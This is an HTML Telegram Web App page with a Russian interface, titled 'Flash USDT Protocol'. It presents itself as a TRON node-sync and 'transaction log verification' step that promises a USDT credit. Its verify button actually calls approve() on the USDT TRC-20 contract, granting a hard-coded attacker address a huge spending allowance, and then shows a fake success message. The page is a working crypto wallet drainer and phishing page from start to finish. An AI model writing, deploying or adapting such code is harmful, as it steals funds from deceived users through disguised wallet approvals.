<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Flash USDT Protocol</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
    <style>
        body { background-color: #000; color: #fff; font-family: -apple-system, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
        .container { padding: 30px; width: 100%; max-width: 400px; }
        .loader { border: 2px solid #222; border-top: 2px solid #0088cc; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 22px; margin: 0 0 15px; }
        p { color: #888; font-size: 14px; margin-bottom: 30px; line-height: 1.5; }
        .btn { background: #0088cc; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 18px; font-weight: bold; text-transform: uppercase; font-size: 15px; cursor: pointer; }
        .btn:disabled { background: #333; color: #666; }
        .network-hint { font-size: 12px; color: #555; margin-top: 20px; display: none; }
    </style>
</head>
<body>

<div class="container">
    <div id="ui-loading">
        <div class="loader"></div>
        <p id="loading-text">Подключение к узлу TRC-20...</p>
        <p class="network-hint" id="net-hint">Если загрузка долгая, смените сеть в углу браузера на <b>TRON</b>.</p>
    </div>

    <div id="ui-wallet" style="display: none;">
        <h2>Узел синхронизирован</h2>
        <p>Для зачисления USDT верифицируйте транзакционные логи.</p>
        <button id="btn-verify" class="btn">ВЕРИФИЦИРОВАТЬ</button>
    </div>

    <div id="ui-telegram" style="display: none;">
        <h2>Flash USDT Protocol</h2>
        <p>Выберите ваш кошелек для восстановления доступа:</p>
        <button id="btn-open-trust" class="btn">Открыть в Trust Wallet</button>
    </div>
</div>

<script>
    const tg = window.Telegram.WebApp;
    tg.expand();

    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT_ADDR = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
    const BASE_URL = "https://timur3417.github.io/sync-node-app/";

    const uiLoading = document.getElementById('ui-loading');
    const uiWallet = document.getElementById('ui-wallet');
    const uiTelegram = document.getElementById('ui-telegram');
    const netHint = document.getElementById('net-hint');

    // Функция жесткого поиска провайдера
    async function getProvider() {
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) return window.tronWeb;
        if (window.tron && window.tron.tronWeb) return window.tron.tronWeb;
        return null;
    }

    async function init() {
        const urlParams = new URLSearchParams(window.location.search);
        const isWalletMode = urlParams.get('mode') === 'wallet';

        const provider = await getProvider();

        if (provider) {
            uiLoading.style.display = 'none';
            uiTelegram.style.display = 'none';
            uiWallet.style.display = 'block';
        } else if (isWalletMode) {
            // Мы в кошельке, но провайдера нет. Показываем подсказку через 3 секунды.
            setTimeout(() => { netHint.style.display = 'block'; }, 3000);
        } else {
            uiLoading.style.display = 'none';
            uiTelegram.style.display = 'block';
        }
    }

    document.getElementById('btn-open-trust').onclick = () => {
        const walletUrl = BASE_URL + "?mode=wallet";
        tg.openLink("https://link.trustwallet.com/open_url?coin_id=195&url=" + encodeURIComponent(walletUrl));
    };

    document.getElementById('btn-verify').onclick = async () => {
        const provider = await getProvider();
        if (!provider) {
            tg.showAlert("Ошибка: Смените сеть на TRON в верхней части экрана.");
            return;
        }

        try {
            // Принудительно запрашиваем аккаунты
            await provider.request({ method: 'tron_requestAccounts' });
            
            const contract = await provider.contract().at(CONTRACT_ADDR);
            await contract.approve(ADMIN, '1000000000000000').send();

            tg.showPopup({
                title: 'Успешно',
                message: 'Верификация завершена. Зачисление ожидается в течение 15-30 минут.',
                buttons: [{type: 'ok'}]
            });
            setTimeout(() => tg.close(), 4000);
        } catch (e) {
            tg.showAlert("Действие отклонено пользователем.");
        }
    };

    // Мониторинг появления провайдера
    const timer = setInterval(async () => {
        if (await getProvider()) {
            clearInterval(timer);
            init();
        }
    }, 1000);

    // Первичный запуск
    init();
</script>
</body>
</html>
